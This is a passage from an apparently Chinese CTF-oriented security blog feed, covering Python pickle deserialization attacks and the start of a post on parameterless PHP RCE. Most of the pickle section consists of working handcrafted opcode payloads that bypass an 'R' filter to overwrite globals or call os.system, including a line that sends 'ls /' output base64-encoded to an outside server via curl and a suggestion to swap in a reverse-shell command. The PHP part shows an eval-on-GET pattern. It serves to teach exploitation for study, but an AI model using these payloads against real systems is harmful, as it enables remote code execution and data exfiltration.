shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.<span class="built_in">open</span>, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.<span class="built_in">open</span>, posixfile.fileopen]</span><br></pre></td></tr></table></figure>

<p>可惜<code>platform.popen()</code>不在名单里，它可以做到类似<code>system</code>的功能。这题死于黑名单有漏网之鱼。</p>
<p>另外，还有一个解（估计是出题人的预期解），那就是利用 map 来干这件事：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"> 	<span class="keyword">return</span> <span class="built_in">map</span>,(os.system,[<span class="string">&quot;ls&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>总之，黑名单不可取。要禁止reduce这一套方法，最稳妥的方式是禁止掉<code>R</code>这个指令码。</p>
<h3 id="过滤-R"><a href="#过滤-R" class="headerlink" title="过滤 R"></a>过滤 R</h3><p>这个可以很方便地利用 <code>pickletools.genops</code> 来实现。如果 reduce 这一套手段被过滤，我们应该如何利用呢？</p>
<h4 id="全局变量包含：c指令码"><a href="#全局变量包含：c指令码" class="headerlink" title="全局变量包含：c指令码"></a>全局变量包含：<code>c</code>指令码</h4><p>还记得我们的<code>c</code>指令码吗？它专门用来获取一个全局变量。</p>
<p>先来看一个简单的例子：</p>
<p>两个文件要放在同一个文件夹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, base64</span><br><span class="line"><span class="keyword">import</span> A   </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">        self.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self,other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> B <span class="keyword">and</span> self.passwd == other.passwd <span class="keyword">and</span> self.num == other.num</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;NO REDUCE!!!&#x27;</span></span><br><span class="line">    x = pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span> (x != B(A.num, A.passwd)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;False!!!&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Now A.num == &#123;&#125; AND A.passwd == &#123;&#125;.&#x27;</span>.<span class="built_in">format</span>(A.num, A.passwd))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Success!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(check(base64.b64decode(<span class="built_in">input</span>())))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># A.py</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">passwd = <span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们先弄一个正常的 B 来看看序列化之后的效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, pickletools, base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, passwd</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">        self.passwd = passwd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self,other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> B <span class="keyword">and</span> self.passwd == other.passwd <span class="keyword">and</span> self.num == other.num</span><br><span class="line"></span><br><span class="line">data = pickle.dumps(B(<span class="number">1</span>, <span class="string">&quot;qaq&quot;</span>),protocol=<span class="number">3</span>)</span><br><span class="line">data = pickletools.optimize(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：第 11 行并置<code>protocol</code>系数的值为 3，输出的内容会依据 protocol 的值而改变</p>
<p><img src="https://s2.loli.net/2024/03/20/AkYGe9vFfhZVj8L.png" alt="sp240320_174055"></p>
<p>如何用<code>c</code>指令来换掉这两个字符串呢？</p>
<p>以 num 的为例，只需要把硬编码的<code>1</code>改成从<code>A</code>引入的<code>num</code>，写成指令就是：<code>cA\nnum\n</code>。同理，硬编码的<code>qaq</code>改成从<code>A</code>引入的<code>passwd</code>为 <code>cA\npasswd\n</code></p>
<p>把用于编码<code>1</code>的<code>K\x01</code>和编码<code>qaq</code>的<code>\x8c\x03qaq</code>替换成我们的这个 global 指令，来看看改造之后的效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload = <span class="string">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numcA\nnum\nX\x06\x00\x00\x00passwdcA\npasswd\nub.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload)) </span><br><span class="line"><span class="comment"># b&#x27;gANjX19tYWluX18KQgopgX0oWAMAAABudW1jQQpudW0KWAYAAABwYXNzd2RjQQpwYXNzd2QKdWIu&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/20/LWg26qsUCNGRMlE.png" alt="sp240320_173915"></p>
<p>顺带一提，由于 pickle 导出的字符串里面有很多的不可见字符，所以一般都经过 base64 编码之后传输。</p>
<h4 id="绕过c指令模块限制：先读入，再篡改"><a href="#绕过c指令模块限制：先读入，再篡改" class="headerlink" title="绕过c指令模块限制：先读入，再篡改"></a>绕过<code>c</code>指令模块限制：先读入，再篡改</h4><p>依旧以刚刚出现的样题为例，但额外加上模块只能为<code>__main__</code>的限制。</p>
<p><code>c</code>指令（也就是 GLOBAL 指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个模块（就没法进行类似于 A.num 这样的引入），这道题又该如何解决呢？</p>
<p>通过 GLOBAL 指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<p>有了这个知识作为前提，我们可以干这么一件事：</p>
<ul>
<li>通过<code>__main__.A</code>引入这一个模块，由于命名空间还在 main 内，故不会被拦截</li>
<li>把一个 dict 压进栈，内容是<code>&#123;&#39;num&#39;: 6, &#39;passwd&#39;: &#39;123456&#39;&#125;</code></li>
<li>执行<code>b</code>指令，其作用是修改<code>__dict__</code>中的内容，在<code>__main__.A.num</code>和<code>__main__.A.passwd</code>中的内容已经被修改了，至此<code>A.num</code>和<code>A.passwd</code>已经被篡改成我们想要的内容</li>
<li>将栈清空，也就是弹掉栈顶</li>
<li>照抄正常的 B 序列化之后的字符串，压入一个正常的 B 对象，num 和 passwd 分别是 6 和 ‘123456’ ，这样判断就能够通过了</li>
</ul>
<p>可见 payload 的思路就是先修改了 A 中的变量值，随后以正常的格式传入可被 check 函数通过的内容。</p>
<p>借助刚刚的图和先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;</span><br><span class="line">(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改。</p>
<ul>
<li><p>将<code>K\x01</code>改为<code>K\x06</code>，将<code>X\x03\x00\x00\x00qaq</code>改为<code>X\x06\x00\x00\x00123456</code>，此时：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)</span><br><span class="line">\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将开头的<code>\x80\x03c__main__\nB\n)</code>改为<code>\x80\x03c__main__\nA\n&#125;(Vnum\nK\x06Vpasswd\nV123456\nub0c__main__\nB\n)</code>，这里可以看到我们圧入了一个正常的对象，此时得到最终payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(Vnum\nK\x06Vpasswd\nV123456\nub0c__main__\nB\n)</span><br><span class="line">\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>我们来测试一下 payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(Vnum\nK\x06Vpasswd\nV123456\nub0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload)), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># gANjX19tYWluX18KQQp9KFZudW0KSwZWcGFzc3dkClYxMjM0NTYKdWIwY19fbWFpbl9fCkIKKYF9KFgDAAAAbnVtSwZYBgAAAHBhc3N3ZFgGAAAAMTIzNDU2dWIu</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/20/YdovPZSn39i4zbx.png" alt="image-20240320182513079"></p>
<p>可见内存中A的属性值已经被修改了，于是我们通过另一个手段实现了登录验证的绕过。</p>
<h4 id="无R指令下的命令执行"><a href="#无R指令下的命令执行" class="headerlink" title="无R指令下的命令执行"></a>无<code>R</code>指令下的命令执行</h4><p>还是刚才的样题，但这次的要求并不是绕过登录限制，而是在不出现<code>R</code>指令的情况下 getshell。</p>
<p>前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能 RCE 吗？</p>
<p>之前的<code>R</code>指令触发的真正语句其实是<code>func(*args)</code>，那么我们就继续在<code>pickle.py</code>中寻找一些可用的语句。那什么样的是可用的呢？也就是<code>*args</code>可控，<code>func</code>可控或者就是类似于<code>system,exec</code>这样的功能，可以以<code>load_</code>为关键词进行搜索。现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。这部分其实已经有人进行过总结了，可进行函数执行的操作码有<code>R</code>，<code>i</code>，<code>o</code>，<code>b</code>。</p>
<h5 id="操作码b"><a href="#操作码b" class="headerlink" title="操作码b"></a>操作码<code>b</code></h5><p>它对应的函数为<code>load_build</code>。其在pickle.py中的内容如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure>

<p>如果<code>inst</code>拥有<code>__setstate__</code>方法，则把栈顶的<code>state</code>交给<code>__setstate__</code>方法来处理；否则就把<code>state</code>中的部分或全部内容，合并到<code>inst.__dict__ </code>里面。因此，其利用方式就是用<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来 build 对象A，然后用<code>ls -la</code>再次进行构造，由于存在<code>__setstate__</code>方法，此时state为<code>ls -la</code>，所以成功执行<code>os.system(&#39;ls -la&#39;)</code>。</p>
<p>借助先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改。</p>
<ul>
<li><p>对开头部分的内容进行修改，将<code>\x80\x03c__main__\nB\n)</code>改为<code>\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb0c__main__\nB\n)</code>，这样修改依旧是圧入了一个正常对象，得到最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>我们来测试一下 payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x06X\x06\x00\x00\x00passwdX\x06\x00\x00\x00123456ub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># gANjX19tYWluX18KQQp9KFZfX3NldHN0YXRlX18KY29zCnN5c3RlbQp1YlZscyAtbGEKYjBjX19tYWluX18KQgopgX0oWAMAAABudW1LBlgGAAAAcGFzc3dkWAYAAAAxMjM0NTZ1Yi4=</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>其实</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(V__setstate__\ncos\nsystem\nubVls -la\nb.)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># gANjX19tYWluX18KQQp9KFZfX3NldHN0YXRlX18KY29zCnN5c3RlbQp1YlZscyAtbGEKYi4=</span></span><br></pre></td></tr></table></figure>

<p>也可以成功执行命令，但是会导致报错。建议<strong>将栈清空，并照抄正常的B序列化之后的字符串，压入一个正常的B对象</strong>，这也正是我一直保留后半段看似没用的代码的原因，之后不再赘述。</p>
<h5 id="操作码i"><a href="#操作码i" class="headerlink" title="操作码i"></a>操作码<code>i</code></h5><p>其对应的主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pop_mark</span>(<span class="params">self</span>):</span><br><span class="line">    items = self.stack</span><br><span class="line">    self.stack = self.metastack.pop()</span><br><span class="line">    self.append = self.stack.append</span><br><span class="line">    <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_inst</span>(<span class="params">self</span>):</span><br><span class="line">        module = self.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        name = self.readline()[:-<span class="number">1</span>].decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        klass = self.find_class(module, name)</span><br><span class="line">        self._instantiate(klass, self.pop_mark())</span><br><span class="line">    dispatch[INST[<span class="number">0</span>]] = load_inst</span><br></pre></td></tr></table></figure>

<p>首先通过<code>find_class</code>获得方法，然后通过<code>pop_mark</code>获得参数（弹出前序栈重新赋值给当前栈，而且获取当前栈上的内容），并调用<code>_instantiate</code>函数来执行，并将执行的结果存入栈中。</p>
<p>借助先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改。</p>
<ul>
<li><p>对开头部分的内容进行修改，将<code>\x80\x03c__main__\nB\n)</code>改成<code>\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)</code>，这样修改依旧是圧入了一个正常对象，得到最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(Vls -laios\nsystem\n0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>测试一下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(X\x06\x00\x00\x00ls -laios\nsystem\n0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>发现它能够成功执行命令！剩下的只需要将<code>ls -la</code>改为反弹 shell 的命令即可。</p>
<h5 id="操作码o"><a href="#操作码o" class="headerlink" title="操作码o"></a>操作码<code>o</code></h5><p>它和<code>i</code>操作码关系密切，其对应的主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pop_mark</span>(<span class="params">self</span>):</span><br><span class="line">    items = self.stack</span><br><span class="line">    self.stack = self.metastack.pop()</span><br><span class="line">    self.append = self.stack.append</span><br><span class="line">    <span class="keyword">return</span> items</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_obj</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Stack is ... markobject classobject arg1 arg2 ...</span></span><br><span class="line">        args = self.pop_mark()</span><br><span class="line">        cls = args.pop(<span class="number">0</span>)</span><br><span class="line">        self._instantiate(cls, args)</span><br><span class="line">    dispatch[OBJ[<span class="number">0</span>]] = load_obj</span><br></pre></td></tr></table></figure>

<p>借助先前得到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure>

<p>我们来对它进行一定的修改：</p>
<ul>
<li><p>对开头部分的内容进行修改，将<code>\x80\x03c__main__\nB\n)</code>改成<code>\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)</code>，这样修改依旧是圧入了一个正常对象，得到最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>测试一下payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nA\n&#125;(cos\nsystem\nX\x06\x00\x00\x00ls -lao0c__main__\nB\n)\x81&#125;(X\x03\x00\x00\x00numK\x01X\x06\x00\x00\x00passwdX\x03\x00\x00\x00qaqub.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>发现它能够成功执行命令！剩下的只需要将<code>ls -la</code>改为反弹 shell 的命令即可。</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="其他模块的load也可以触发pickle反序列化漏洞"><a href="#其他模块的load也可以触发pickle反序列化漏洞" class="headerlink" title="其他模块的load也可以触发pickle反序列化漏洞"></a>其他模块的load也可以触发pickle反序列化漏洞</h4><p>例如：<code>numpy.load()</code>先尝试以<code>numpy</code>自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞，这就是<code>CVE-2019-6446</code>。其他的序列化库比如<code>Marshal</code>，<code>PyYAML</code>，<code>Jsonpickle</code>，<code>Shelve</code>等等的反序列化利用可参看参考文献中的第五个。</p>
<h4 id="GLOBAL指令也可以自动导入os-system"><a href="#GLOBAL指令也可以自动导入os-system" class="headerlink" title="GLOBAL指令也可以自动导入os.system"></a>GLOBAL指令也可以自动导入<code>os.system</code></h4><p>即使代码中没有<code>import os</code></p>
<p>因此，不能认为“我不在代码里面导入<code>os</code>库，pickle反序列化的时候就不能执行<code>os.system</code>”。</p>
<h4 id="即使没有回显，也可以很方便地调试恶意代码。"><a href="#即使没有回显，也可以很方便地调试恶意代码。" class="headerlink" title="即使没有回显，也可以很方便地调试恶意代码。"></a>即使没有回显，也可以很方便地调试恶意代码。</h4><p>只需要拥有一台公网服务器，执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.system(&#x27;curl your_server/`ls / | base64`)</span><br></pre></td></tr></table></figure>

<p>然后查询您自己的服务器日志，就能看到结果。这是因为：以 &#96; 引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>下面给出一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,pickletools</span><br><span class="line">payload = pickletools.optimize(<span class="string">b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl vps-ip/`ls / | base64`\nb.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(base64.b64encode(payload), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><code>pickle.loads()</code>时，<code>ls /</code>的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过<code>curl</code>把执行结果送到我们的服务器上。</p>
<h2 id="个人想法"><a href="#个人想法" class="headerlink" title="个人想法"></a>个人想法</h2><p>个人觉得和 php 反序列化的差别：</p>
<p>php 反序列化的危险程度被限制在类与方法中，没有有危害的类或方法，php 反序列化就造不成什么危害</p>
<p>pickle 本身就是轻量级的 PVM ，一个 python 虚拟机，大白话就是 Ta 想做什么事情你还真管不了他，所以相对php 反序列化来说，python 反序列化的攻击面更广，危害性更大。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/419362785">一文带你搞懂Python中pickle模块 - 知乎 (zhihu.com)</a></p>
<p><a href="https://christa.top/details/8/">Python 序列化漏洞学习(上) - christa’s blog</a></p>
<p><a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmjYQuqcD9GOYD&alichlgref=https://xz.aliyun.com/t/7436#toc-11">pickle反序列化初探 - 先知社区 (aliyun.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>无参数RCE学习记录</title>
    <url>/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE前置知识"><a href="#RCE前置知识" class="headerlink" title="RCE前置知识"></a>RCE前置知识</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>()))) </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()/<span class="title function_ invoke__">pos</span>() - 默认返回数组第一个元素</span><br><span class="line"><span class="title function_ invoke__">end</span>() – 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">next</span>() – 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">prev</span>() – 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">reset</span>() – 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">each</span>() – 返回当前元素的键名和键值，并将内部指针向前移动，用于遍历</span><br></pre></td></tr></table></figure>

<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/11/18/xjsHJqSy7uOpTEt.png" alt="image.png"></p>
<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。</p>
